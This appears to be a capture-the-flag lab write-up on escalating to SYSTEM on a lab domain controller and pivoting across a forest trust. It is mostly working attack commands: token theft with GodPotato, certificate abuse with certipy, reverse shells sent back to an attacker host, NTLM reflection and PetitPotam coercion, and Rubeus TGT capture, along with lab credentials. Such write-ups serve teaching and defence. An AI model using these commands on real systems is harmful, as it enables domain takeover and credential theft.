Privilege Escalation on DC02

Multiple paths were identified to reach SYSTEM on DC02:

Escalation Path 1: Token Theft

We recover an original token from a named pipe to regain SeImpersonatePrivilege.

# On DC02 PowerShell
import-module .\NtObjectManager.psm1
$pipe = New-NtNamedPipeFile \\.\pipe\oxdf -Win32Path
$job = Start-Job { $pipe.Listen() }
$file = Get-NtFile \\localhost\pipe\oxdf -Win32Path
$token = Use-NtObject($pipe.Impersonate()) { Get-NtToken -Impersonation }

# Verify SeImpersonatePrivilege
$token.privileges | ft Name, Attributes

# Use GodPotato with the token
New-Win32Process -Commandline 'gp.exe -cmd "powershell shell.ps1"' -token $token

Success! Reverse shell received as nt authority\system.

Escalation Path 2: ADCS / RunAsCs

By requesting a certificate for svc_sql, we can retrieve its NT hash and change the password, then use RunAsCs.exe with a Service Logon (Type 5) to get a full token.

# Request cert and retrieve NT hash
proxychains certipy req -u svc_sql -k -no-pass -dc-host DC02.darkzero.ext -target DC02.darkzero.ext -ca darkzero-ext-DC02-CA -template user
proxychains certipy auth -pfx svc_sql.pfx -domain darkzero.ext -dc-ip 172.16.20.2

# Update password using the hash
proxychains changepasswd.py -hashes :816ccb849956b531db139346751db65f -newpass 0xdf0xdf. darkzero.ext/svc_sql@dc02.darkzero.ext

# Get shell with full token
.\runascs.exe svc_sql 0xdf0xdf. cmd.exe -r $kali_ip:444 --logon-type 5 --bypass-uac

Escalation Path 3: NTLM Authentication Reflection

DC02 is missing patches for NTLM reflection. We use the CMTI (Credential Target Information) trick to reflect DC02's machine account authentication back to itself via LDAPS.

# Create DNS record with CMTI data
proxychains dnstool.py -u 'darkzero.htb\john.w' -p 'RFulUtONCOL!' -a add -r 'DC021UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -d $kali_ip -dns-ip 172.16.20.2 --tcp DC02.darkzero.ext

# Start relay with MIC removal
proxychains ntlmrelayx.py -t ldaps://172.16.20.2 -i --remove-mic-partial -smb2support

# Coerce DC02$ auth
proxychains netexec smb DC02.darkzero.ext -u john.w -p 'RFulUtONCOL!' -M coerce_plus -o LISTENER=DC021UWhRCA...YBAAAA METHOD=petitpotam

In the resulting LDAP shell (running as SYSTEM):

# change_password oxdf 0xdf0xdf.
# add_user_to_group oxdf administrators

Pivoting to DC01 via Domain Trust

DC02 and DC01 have a bi-directional forest trust with TGT Delegation enabled (TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION).

PS> nltest /domain_trusts /all_trusts
0: darkzero darkzero.htb (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans )
1: darkzero-ext darkzero.ext (NT 5) (Forest Tree Root) (Primary Domain) (Native)

Capturing DC01$ TGT

As SYSTEM on DC02, we run Rubeus in monitor mode and trigger a request from DC01's MSSQL service via xp_dirtree to a share on DC02.

# On DC02
.\Rubeus.exe monitor /interval:10

# On DC01 (via local MSSQL shell)
SQL> xp_dirtree \\DC02.darkzero.ext\C$

Rubeus captures the delegation TGT for DC01$@DARKZERO.HTB.

Key Takeaways

  • MSSQL Linked Servers are a powerful pivot point across trust boundaries.
  • TGT Delegation in forest trusts is extremely dangerous as it allows service hosts to impersonate callers across the entire forest.
  • Hardening service accounts by stripping privileges is effective, but original tokens can sometimes be recovered if the logon session is shared.
  • The CMTI DNS trick remains a viable path for NTLM reflection even in patched environments if misconfigured.
